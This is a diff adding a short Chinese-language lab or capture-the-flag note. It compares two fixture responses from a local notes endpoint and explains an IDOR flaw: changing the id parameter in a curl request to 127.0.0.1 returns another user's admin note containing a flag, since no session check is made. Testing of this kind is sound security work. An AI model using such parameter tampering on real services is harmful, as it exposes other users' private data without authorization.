@@ -1,0 +1,17 @@
+目标占位流程：
+
+两个 fixture 响应对比：
+
+| 字段 | `id=1` | `id=2` |
+|---|---|---|
+| `id` | `"1"` | `"2"` |
+| `note` | `"alice-note"` | `"admin-secret-FLAG{idor_user2}"` |
+| `viewer` | `null` | `null` |
+
+差异点：
+
+- 结构完全一致（同 schema，3 个字段），仅 `note` 内容不同。
+- `id=1` 返回普通用户占位数据 `alice-note`。
+- `id=2` 返回带 flag 的高权限占位数据 `admin-secret-FLAG{idor_user2}` —— 对象引用仅由 `id` 参数直接决定，未绑定 viewer 身份（`viewer: null` 说明无会话校验），即典型 auth bypass/IDOR 模式：改 `id` 即可读取越权对象。
+
+获取方式：`curl -s "http://127.0.0.1:18081/notes?id=1"` 与 `?id=2`，原样输出见上方工具结果。
